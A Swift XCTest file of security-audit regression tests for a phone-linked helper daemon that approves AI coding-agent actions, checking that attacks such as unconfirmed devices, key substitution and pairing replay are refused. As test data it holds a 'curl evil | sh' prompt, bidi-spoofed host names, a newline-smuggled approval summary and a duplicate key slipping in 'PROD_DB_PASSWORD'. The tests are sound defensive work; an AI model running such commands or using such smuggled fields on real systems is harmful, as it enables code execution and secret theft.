import Foundation
import WhisperaLink
import XCTest

@testable import LinkHelperCore

/// Regression tests for the 2026-10-06 security audit: each attack is replayed against a real
/// helper and must now be refused.
final class SecurityAuditTests: XCTestCase {
	var backend: FakeAccountBackend!
	var helper: TestDaemon!

	override func setUpWithError() throws {
		backend = FakeAccountBackend()
		backend.addAccount("alice", bearer: "tok-alice")
		helper = try TestDaemon(engine: FakeEngine(), accountTransport: backend) { config in
			config.accountPollWait = -1
			config.macName = "Test Mac"
			config.approvalFallback = 0.2
		}
	}

	override func tearDown() {
		helper.stop()
	}

	private var account: AccountLink { helper.daemon.account }

	private func soft(_ phone: AccountPhone, sttKey: String = "") -> SoftPhone {
		let soft = SoftPhone(baseURL: helper.baseURL, linkKey: phone.linkKey, approveKey: phone.approveKey)
		soft.deviceID = phone.deviceID
		soft.sttKey = sttKey
		return soft
	}

	/// A phone the account lists (say, one a hostile backend or a stolen session added), pinned
	/// by a sync. Returns it and the Mac's account id.
	private func listedPhone(name: String = "Izzy's iPhone") async throws -> (AccountPhone, String) {
		let phone = AccountPhone(backend: backend)
		try await phone.register(bearer: "tok-alice", name: name)
		let status = try await account.connect(bearer: "tok-alice", backendURL: backend.baseURL)
		let macID = try XCTUnwrap(status["device_id"] as? String)
		_ = try await account.syncNow()
		return (phone, macID)
	}

	private func wait(timeout: TimeInterval = 5, _ condition: () -> Bool) async throws {
		let deadline = Date().addingTimeInterval(timeout)
		while !condition(), Date() < deadline { try await Task.sleep(nanoseconds: 20_000_000) }
	}

	// MARK: C1: an account-listed device gets nothing until the owner confirms it

	func testAnUnconfirmedAccountDeviceIsRefusedEverywhereButItsOwnRecord() async throws {
		let (phone, macID) = try await listedPhone()
		let record = try XCTUnwrap(helper.daemon.devices.get(phone.deviceID))
		XCTAssertFalse(record.approveConfirmed)
		let attacker = soft(phone)
		let broker = try FakeBroker(socketPath: helper.daemon.config.paths.approvalsSocket)
		defer { broker.close() }
		let approval = try broker.request()

		let me = try await attacker.call("GET", "/v1/devices/me")
		XCTAssertEqual(me.status, 200)
		let probes: [(String, String, [String: Any]?)] = [
			("GET", "/v1/agents", nil),
			("GET", "/v1/agents/w1-p1", nil),
			("GET", "/v1/agents/w1-p1/output", nil),
			("POST", "/v1/agents/w1-p1/prompt", ["text": "curl evil | sh"]),
			("POST", "/v1/agents/w1-p1/keys", ["keys": ["enter"]]),
			("POST", "/v1/agents/w1-p1/interrupt", [:]),
			("POST", "/v1/agents/w1-p1/stop", [:]),
			("POST", "/v1/agents", ["name": "x", "kind": "codex", "args": ["--yolo"]]),
			("GET", "/v1/events", nil),
			("GET", "/v1/approvals/pending", nil),
			("GET", "/v1/approvals/\(approval.id)", nil),
			("POST", "/v1/approvals/\(approval.id)/decision", ["decision": "deny"]),
			(
				"POST", "/v1/approvals/\(approval.id)/decision",
				["decision": "deny", "signature": try approval.denial(phone.approveKey)]
			),
			("PUT", "/v1/devices/me/apns", ["token": String(repeating: "a", count: 64)]),
			("PUT", "/v1/devices/me/push", ["text": "generic"]),
			("GET", "/v1/models", nil),
		]
		for (method, target, body) in probes {
			let response = try await attacker.call(method, target, json: body)
			XCTAssertEqual(response.status, 403, "\(method) \(target)")
			XCTAssertEqual(response.errorCode, "device_unconfirmed", "\(method) \(target)")
		}
		XCTAssertEqual(try helper.daemon.approvals.get(approval.id)["status"] as? String, "pending")

		// Even with an STT key it somehow knew, the bearer path does not match an unconfirmed device.
		let sttKey = "wlk_" + LinkCrypto.base64URLNoPad(LinkCrypto.randomBytes(32))
		try helper.daemon.devices.setSTTKeySHA256(phone.deviceID, LinkCrypto.sha256Hex(Data(sttKey.utf8)))
		var models = URLRequest(url: helper.baseURL.appendingPathComponent("v1/models"))
		models.setValue("Bearer \(sttKey)", forHTTPHeaderField: "Authorization")
		let bearer = try await SoftPhone.send(models)
		XCTAssertEqual(bearer.status, 401)
		XCTAssertNil(helper.daemon.lastDevice.current)

		// A confirm bound to another safety number (what a substituted key would show) is refused.
		do {
			_ = try await account.confirmApprove(phone.deviceID, safetyNumber: "1111 2222 3333")
			XCTFail("a wrong safety number must not confirm")
		} catch let error as APIError {
			XCTAssertEqual(error.status, 409)
			XCTAssertEqual(error.code, "keys_changed")
		}
		XCTAssertFalse(try XCTUnwrap(helper.daemon.devices.get(phone.deviceID)).approveConfirmed)

		// The owner compares the number on both screens and confirms: now it may.
		_ = try await account.confirmApprove(phone.deviceID, safetyNumber: try phone.safetyNumber(macID: macID))
		let agents = try await attacker.call("GET", "/v1/agents")
		XCTAssertEqual(agents.errorCode, "herdr_unavailable", "past the gate; only herdr is missing here")
		let pending = try await attacker.call("GET", "/v1/approvals/pending")
		XCTAssertEqual(pending.status, 200)
	}

	func testBackendSuppliedNamesLoseControlAndBidiCharacters() async throws {
		let (phone, _) = try await listedPhone(name: "Izzy\u{202E}enohPi\n\u{200B}" + String(repeating: "x", count: 80))
		let name = try XCTUnwrap(helper.daemon.devices.get(phone.deviceID)).name
		XCTAssertFalse(name.unicodeScalars.contains(where: CanonicalApproval.isUnsafe))
		XCTAssertTrue(name.hasPrefix("IzzyenohPi"))
		XCTAssertLessThanOrEqual(name.count, 64)
	}

	// MARK: H2: key substitution

	func testAKeyChangeOnAConfirmedPhoneMakesItUnconfirmedAndSendsItNothing() async throws {
		let (phone, macID) = try await listedPhone()
		_ = try await account.confirmApprove(phone.deviceID, safetyNumber: try phone.safetyNumber(macID: macID))
		_ = try await phone.receive()
		XCTAssertTrue(try XCTUnwrap(helper.daemon.devices.get(phone.deviceID)).approveConfirmed)

		// The backend now lists the same device id with keys it controls.
		let impostor = AccountPhone(backend: backend)
		try await impostor.register(bearer: "tok-alice", name: "Izzy's iPhone")
		backend.substituteKeys(of: phone.deviceID, from: impostor.deviceID)
		let sends = backend.sendCount
		let report = try await account.syncNow()
		XCTAssertEqual(report.keyChanged, [phone.deviceID])
		XCTAssertEqual(report.offered, [])
		XCTAssertEqual(backend.sendCount, sends, "no offer to the substituted keys")
		let record = try XCTUnwrap(helper.daemon.devices.get(phone.deviceID))
		XCTAssertFalse(record.approveConfirmed)
		XCTAssertEqual(record.sttKeySHA256, "")
		XCTAssertNotNil(record.keyChangedAt)
		XCTAssertEqual(record.linkPubkey, impostor.linkKey.publicKey.x963Base64)

		let pending = await account.pendingConfirmations()
		XCTAssertEqual(pending.first?["key_changed"] as? Bool, true)
		let status = await account.statusObject()
		XCTAssertEqual(status["key_changed"] as? [String], [phone.deviceID])
		let log = try String(contentsOfFile: helper.daemon.config.paths.log, encoding: .utf8)
		XCTAssertTrue(log.contains("device.key_changed"))

		// The impostor's keys are refused like any unconfirmed device...
		let asImpostor = SoftPhone(baseURL: helper.baseURL, linkKey: impostor.linkKey, approveKey: impostor.approveKey)
		asImpostor.deviceID = phone.deviceID
		let agents = try await asImpostor.call("GET", "/v1/agents")
		XCTAssertEqual(agents.errorCode, "device_unconfirmed")
		// ...the old keys no longer verify, and the safety number the real phone shows does not
		// confirm the new keys.
		let old = try await soft(phone).call("GET", "/v1/devices/me")
		XCTAssertEqual(old.errorCode, "auth_bad_signature")
		do {
			_ = try await account.confirmApprove(phone.deviceID, safetyNumber: try phone.safetyNumber(macID: macID))
			XCTFail("the old safety number must not confirm new keys")
		} catch let error as APIError {
			XCTAssertEqual(error.code, "keys_changed")
		}
	}

	func testAnAgreementKeyOnlyChangeAlsoUnconfirms() async throws {
		let (phone, macID) = try await listedPhone()
		_ = try await account.confirmApprove(phone.deviceID, safetyNumber: try phone.safetyNumber(macID: macID))
		_ = try await phone.receive()
		let substitute = SoftwareAgreementKey()
		backend.setKEMRecord(
			of: phone.deviceID, try KEMKeyRecord.sign(substitute.publicKey, linkKey: phone.linkKey).base64)
		let sends = backend.sendCount
		let report = try await account.syncNow()
		XCTAssertEqual(report.keyChanged, [phone.deviceID])
		XCTAssertEqual(backend.sendCount, sends)
		let record = try XCTUnwrap(helper.daemon.devices.get(phone.deviceID))
		XCTAssertFalse(record.approveConfirmed)
		XCTAssertEqual(record.kemPubkey, substitute.publicKey.x963Base64)
		XCTAssertNil(helper.daemon.pushSealer.seal(ApprovalPush(requestID: "apr_x", expiresAt: 0), phoneID: phone.deviceID))
	}

	// MARK: C1/M8: pushes only to confirmed phones

	func testApprovalPushesAndSealedTextGoOnlyToConfirmedPhones() async throws {
		let (confirmed, macID) = try await listedPhone(name: "Mine")
		let rogue = AccountPhone(backend: backend)
		try await rogue.register(bearer: "tok-alice", name: "Rogue")
		_ = try await account.syncNow()
		_ = try await account.confirmApprove(
			confirmed.deviceID, safetyNumber: try confirmed.safetyNumber(macID: macID))
		XCTAssertNil(
			helper.daemon.pushSealer.seal(ApprovalPush(requestID: "apr_x", expiresAt: 0), phoneID: rogue.deviceID))

		let broker = try FakeBroker(socketPath: helper.daemon.config.paths.approvalsSocket)
		defer { broker.close() }
		let approval = try broker.request()
		XCTAssertEqual(approval.ackDevices, 1)
		try await wait { !self.backend.notifyCalls.isEmpty }
		try await Task.sleep(nanoseconds: 500_000_000)
		let pushed = backend.notifyCalls.filter { $0.kind == "approval" }
		XCTAssertEqual(pushed.map(\.device_id), [confirmed.deviceID])
		XCTAssertNotNil(pushed.first?.sealed)
		XCTAssertFalse(backend.notifyCalls.contains { $0.device_id == rogue.deviceID })
		let rogueMessages = try await rogue.receive()
		XCTAssertEqual(rogueMessages, [], "no link offer to an unconfirmed phone")

		let plan = RelayPush.plan(
			helper.daemon.devices.active(), preferDevice: rogue.deviceID, lastDevice: rogue.deviceID)
		XCTAssertNil(plan.preferred)
		XCTAssertEqual(plan.others.map(\.deviceID), [confirmed.deviceID])
	}

	// MARK: M7: unsafe canonical requests are refused at intake

	private func inject(_ canonical: Data, requestID: String, expiresAt: Int) throws -> [String: Any] {
		let connection = try UnixConnection.connect(path: helper.daemon.config.paths.approvalsSocket, timeout: 2)
		defer { connection.close() }
		try connection.sendLine([
			"op": "approval.request", "v": 1, "request_id": requestID,
			"canonical_b64": canonical.base64EncodedString(), "expires_at": expiresAt,
		])
		guard case .line(let line) = try connection.readLine(timeout: 3) else { return [:] }
		return WireJSON.decodeObject(line) ?? [:]
	}

	func testCanonicalRequestsWithNewlinesBidiOrDuplicateKeysAreRefused() throws {
		let now = Int(Date().timeIntervalSince1970)
		func fields(_ id: String, summary: String, host: String = "mac") -> [String: Any] {
			[
				"v": 1, "request_id": id, "nonce": LinkCrypto.makeNonce(), "op": "bws", "key": "GITHUB_TOKEN",
				"summary": summary, "project": "demo", "token": "read", "host": host, "caller": "agent", "via": "cli",
				"broker": "test", "created_at": now, "expires_at": now + 120,
			]
		}
		for (summary, host) in [
			("read GITHUB_TOKEN\nhost: trusted-ci\n\n\n(real: exfil)", "mac"),
			("read GITHUB_TOKEN", "build\u{202E}xob"),
			("read \u{200B}GITHUB_TOKEN", "mac"),
		] {
			let id = LinkCrypto.newPrefixedID("apr")
			let bytes = try XCTUnwrap(WireJSON.pythonCanonical(fields(id, summary: summary, host: host)))
			let reply = try inject(bytes, requestID: id, expiresAt: now + 120)
			XCTAssertEqual(reply["op"] as? String, "approval.error", summary)
			XCTAssertEqual(reply["code"] as? String, "unsafe_characters", summary)
			XCTAssertThrowsError(try helper.daemon.approvals.get(id))
		}

		// A duplicate key: the first copy harmless, the second the real one.
		let id = LinkCrypto.newPrefixedID("apr")
		let clean = try XCTUnwrap(WireJSON.pythonCanonical(fields(id, summary: "read HARMLESS")))
		var text = String(decoding: clean, as: UTF8.self)
		text.insert(contentsOf: #""key":"PROD_DB_PASSWORD","#, at: text.index(after: text.startIndex))
		let reply = try inject(Data(text.utf8), requestID: id, expiresAt: now + 120)
		XCTAssertEqual(reply["op"] as? String, "approval.error")
		XCTAssertEqual(reply["code"] as? String, "malformed")
		XCTAssertTrue(helper.daemon.approvals.pending().isEmpty)
	}

	// MARK: H3: pairing v2 (commit, then reveal)

	private func liveCode() -> String {
		(helper.daemon.pairing.begin(ttl: 60)["code"] as! String).replacingOccurrences(of: "-", with: "")
	}

	func testACapturedRevealCannotPairOtherKeysAndBurnsTheCode() async throws {
		let code = liveCode()
		let owner = SoftPhone(baseURL: helper.baseURL)
		// The owner's phone commits and reveals; an on-path attacker holds the reveal back and
		// sends the code it just read with its own keys and proofs.
		let run = try await owner.pairV2(code: code, daemonFP: helper.daemon.daemonFP, reveal: false)
		XCTAssertEqual(run.commit.status, 201)
		let attacker = SoftPhone(baseURL: helper.baseURL)
		var forged = try attacker.pairingBody(
			code: try XCTUnwrap(run.reveal["code"] as? String), daemonFP: helper.daemon.daemonFP,
			pairID: try XCTUnwrap(run.reveal["pair_id"] as? String),
			nonce: try XCTUnwrap(Data(base64Encoded: run.reveal["nonce"] as? String ?? "")))
		forged["name"] = "Izzy's iPhone"
		let refused = try await attacker.reveal(forged)
		XCTAssertEqual(refused.status, 409)
		XCTAssertEqual(refused.errorCode, "pair_locked")
		XCTAssertFalse(helper.daemon.pairing.isLive, "the code is burned")
		XCTAssertEqual(helper.daemon.devices.all().count, 0)
		// The owner's own reveal now fails too: nothing pairs from this code.
		let late = try await owner.reveal(run.reveal)
		XCTAssertEqual(late.errorCode, "pair_locked")
		XCTAssertEqual(helper.daemon.devices.all().count, 0)
	}

	func testASecondCommitmentBurnsTheCode() async throws {
		let code = liveCode()
		let first = try await SoftPhone(baseURL: helper.baseURL).pairV2(
			code: code, daemonFP: helper.daemon.daemonFP, reveal: false)
		XCTAssertEqual(first.commit.status, 201)
		let second = try await SoftPhone(baseURL: helper.baseURL).pairV2(
			code: code, daemonFP: helper.daemon.daemonFP, reveal: false)
		XCTAssertEqual(second.commit.status, 409)
		XCTAssertEqual(second.commit.errorCode, "pair_locked")
		XCTAssertFalse(helper.daemon.pairing.isLive)
		let reveal = try await SoftPhone(baseURL: helper.baseURL).reveal(first.reveal)
		XCTAssertEqual(reveal.errorCode, "pair_locked")
	}

	func testARevealWithoutItsCommitmentOrWithAnotherPairIDBurnsTheCode() async throws {
		let code = liveCode()
		let phone = SoftPhone(baseURL: helper.baseURL)
		let body = try phone.pairingBody(
			code: code, daemonFP: helper.daemon.daemonFP, pairID: "pc_aaaaaaaaaaaaaaaaaaaaaaaa",
			nonce: LinkCrypto.randomBytes(32))
		let response = try await phone.reveal(body)
		XCTAssertEqual(response.errorCode, "pair_locked")
		XCTAssertFalse(helper.daemon.pairing.isLive)
	}

	func testVersionOnePairingIsRefusedWithAnUpgradeHint() async throws {
		let code = liveCode()
		let phone = SoftPhone(baseURL: helper.baseURL)
		var body = try phone.pairingBody(
			code: code, daemonFP: helper.daemon.daemonFP, pairID: "", nonce: LinkCrypto.randomBytes(32))
		body["v"] = 1
		body["pair_id"] = nil
		body["nonce"] = nil
		let response = try await phone.reveal(body)
		XCTAssertEqual(response.status, 400)
		XCTAssertEqual(response.errorCode, "pair_upgrade_required")
		XCTAssertTrue(helper.daemon.pairing.isLive, "an old phone does not burn the code")
		let commitV1 = try await SoftPhone.post(
			helper.baseURL.appendingPathComponent("v1/pair/commit"), ["v": 1, "commitment": String(repeating: "a", count: 64)])
		XCTAssertEqual(commitV1.errorCode, "pair_upgrade_required")
	}

	func testHonestPairingV2PairsAConfirmedDevice() async throws {
		let code = liveCode()
		let phone = SoftPhone(baseURL: helper.baseURL)
		let run = try await phone.pairV2(code: code, daemonFP: helper.daemon.daemonFP)
		let response = try XCTUnwrap(run.response)
		XCTAssertEqual(response.status, 201)
		let key = try LinkPublicKey(x963Base64: response.json["daemon_pubkey"] as? String ?? "")
		let signature = Data(base64Encoded: response.headers["X-WL-Server-Signature"] as? String ?? "") ?? Data()
		XCTAssertTrue(key.isValidSignature(signature, for: LinkCrypto.pairResponseMessage(body: response.body)))
		XCTAssertTrue(try XCTUnwrap(helper.daemon.devices.get(phone.deviceID)).approveConfirmed)
		let me = try await phone.call("GET", "/v1/devices/me")
		XCTAssertEqual(me.status, 200)
	}
}
